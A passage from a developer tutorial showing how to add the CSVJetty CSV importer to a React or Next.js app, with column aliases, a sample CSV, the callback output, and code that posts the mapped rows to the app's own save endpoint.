&lt;p&gt;Create an importer in the &lt;a href="https://www.csvjetty.com/?utm_source=dev.to&amp;amp;utm_medium=referral&amp;amp;utm_campaign=react_csv_import_tutorial&amp;amp;utm_content=setup"&gt;CSVJetty dashboard&lt;/a&gt; and select &lt;strong&gt;OnData Callback&lt;/strong&gt; as its delivery mode. Copy its public importer key.&lt;/p&gt;

&lt;p&gt;The example below defines the columns in code.&lt;/p&gt;

&lt;h2&gt;


2. Add the importer
&lt;/h2&gt;

&lt;p&gt;Create &lt;code&gt;ImportContacts.jsx&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;use client&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;CSVJetty&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;csvjetty&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;columns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;first_name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;First name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;aliases&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;First Name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Given Name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;last_name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Last name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;aliases&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Last Name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Surname&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;email&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Email&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;email&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;aliases&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Email Address&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Work Email&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;ImportContacts&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;contacts&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setContacts&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;([]);&lt;/span&gt;

&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;section&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Import contacts&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;CSVJetty&lt;/span&gt;
&lt;span class="na"&gt;importerKey&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"YOUR_IMPORTER_KEY"&lt;/span&gt;
&lt;span class="na"&gt;columns&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;columns&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="na"&gt;onData&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="k"&gt;async &lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;rows&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nf"&gt;setContacts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;rows&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
Import CSV
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nc"&gt;CSVJetty&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;contacts&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Imported contacts: &lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;contacts&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;pre&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;stringify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;contacts&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;pre&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;section&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Replace &lt;code&gt;YOUR_IMPORTER_KEY&lt;/code&gt; with your public importer key.&lt;/p&gt;

&lt;p&gt;This example displays the records in memory so you can inspect the output. It doesn't save them to a database.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;"use client"&lt;/code&gt; directive allows this component to work in Next.js App Router. In a plain React app, you can omit it.&lt;/p&gt;

&lt;h2&gt;


3. Try a file with different headers
&lt;/h2&gt;

&lt;p&gt;Save this as &lt;code&gt;contacts.csv&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Given Name,Surname,Work Email
Ada,Lovelace,ada@example.com
Grace,Hopper,grace@example.com
Katherine,Johnson,not-an-email
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Upload the file using the &lt;strong&gt;Import CSV&lt;/strong&gt; button.&lt;/p&gt;

&lt;p&gt;The aliases help match &lt;code&gt;Given Name&lt;/code&gt; to &lt;code&gt;first_name&lt;/code&gt;, &lt;code&gt;Surname&lt;/code&gt; to &lt;code&gt;last_name&lt;/code&gt;, and &lt;code&gt;Work Email&lt;/code&gt; to &lt;code&gt;email&lt;/code&gt;. Users can review and adjust the mappings.&lt;/p&gt;

&lt;p&gt;The third record contains an invalid email. Correct it to &lt;code&gt;katherine@example.com&lt;/code&gt; in the preview before importing.&lt;/p&gt;

&lt;p&gt;In the dashboard, enable &lt;strong&gt;Disable Importing All Data if There Are Invalid Rows&lt;/strong&gt; if you want to require every row to pass validation before submission.&lt;/p&gt;

&lt;p&gt;The callback receives records using your configured field names:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight json"&gt;&lt;code&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="nl"&gt;"first_name"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"Ada"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="nl"&gt;"last_name"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"Lovelace"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="nl"&gt;"email"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"ada@example.com"&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="nl"&gt;"first_name"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"Grace"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="nl"&gt;"last_name"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"Hopper"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="nl"&gt;"email"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"grace@example.com"&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="nl"&gt;"first_name"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"Katherine"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="nl"&gt;"last_name"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"Johnson"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="nl"&gt;"email"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"katherine@example.com"&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Your backend gets a consistent shape even when customers use different CSV headers.&lt;/p&gt;

&lt;h2&gt;


4. Connect your existing save endpoint
&lt;/h2&gt;

&lt;p&gt;Once the preview works, update &lt;code&gt;ImportContacts.jsx&lt;/code&gt; to send the records to your application's API:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;use client&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;CSVJetty&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;csvjetty&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;columns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;first_name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;First name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;aliases&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;First Name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Given Name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;last_name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Last name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;aliases&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Last Name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Surname&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;email&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;label&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Email&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;email&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;aliases&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Email Address&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Work Email&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;ImportContacts&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;importedCount&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setImportedCount&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;handleImport&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;rows&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;importId&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;rowNumbers&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nf"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/api/contacts/import&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;POST&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Content-Type&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;application/json&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="na"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;stringify&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
&lt;span class="nx"&gt;rows&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nx"&gt;importId&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nx"&gt;rowNumbers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;}),&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="k"&gt;if &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nc"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Could not save contacts. Please try again.&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nf"&gt;setImportedCount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;rows&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

